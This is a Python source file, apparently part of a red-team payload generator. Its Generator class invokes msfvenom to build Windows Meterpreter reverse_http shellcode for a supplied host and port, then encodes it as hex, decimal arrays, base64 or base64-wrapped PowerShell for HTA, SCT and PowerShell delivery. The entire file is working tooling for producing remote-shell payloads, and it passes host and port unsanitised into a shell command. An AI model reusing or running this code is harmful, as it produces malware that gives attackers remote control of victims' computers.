from display import *

import os
import re
import base64

class Generator():


	def genShellcode(self, host, port, arch, shellProcess = None):
		#TODO fix to use string .format, remove the filewrite
		code = ''
		form = 'c'

		if shellProcess == 'hexEncode':
			form = "c"
		elif shellProcess == 'decEncode':
			form = "vba"
		elif shellProcess == 'b64Encode':
			form = "raw"
		elif shellProcess == 'pshEncode':
			form = "psh"
		
		if (arch  == "x86"):
			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
		else:
			os.system("msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")

		with open("/tmp/metasploit", 'rb') as f:
			code = f.read()

		shellcode = str(code)
		
		if shellProcess == 'hexEncode':
			shellcode = self.hexEncode(shellcode)
		elif shellProcess == 'decEncode':
			shellcode = self.decEncode(shellcode)
		elif shellProcess == 'b64Encode':
			shellcode = self.b64Encode(shellcode)
		elif shellProcess == 'pshEncode':
			shellcode = self.pshEncode(shellcode)

		return shellcode



	def hexEncode(self, shellcode):
		#currently used to format mshta based payloads
		shellcode = "0x" + shellcode[30:-5]
		shellcode = shellcode.replace("\\\\", ",0")
		shellcode = shellcode.replace("\"\\n\"", "\n")

		return shellcode

	def b64Encode(self, code):
		#HTA-Shellcode
		shellcode = str(base64.b64encode(code))
		shellcode = shellcode[2:-1]
		return shellcode

	def decEncode(self, shellcode):
		#currently used for SCT based payloads
		shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", str(shellcode), flags=re.MULTILINE)
		shellcode = ''.join(i[0].replace('', '') for i in shellcode)

		k = shellcode.rfind(")\\r\\n\\n\\t")
		shellcode = shellcode[:k+5]

		even = 1
		lineEnd = " _\\r\\n"

		for i in range(0, len(shellcode)):
			if shellcode[i : i+len(lineEnd)] == lineEnd:
				if even == 2:
					shellcode = shellcode[:i]+shellcode[i+len(lineEnd):]
					even = even>>1
				else:
					shellcode = shellcode[:i]+" _\r\n"+shellcode[i+len(lineEnd):]
					even = even<<1
		shellcode = shellcode[:-4]	
			
		return(shellcode)

	def pshEncode(self, shellcode):
		shellcode = "for (;;){\n  Start-sleep 60\n}" + shellcode
		shellcode = base64.b64encode(shellcode.encode('utf-8'))
		shellcode = shellcode.decode('utf-8')

		return shellcode
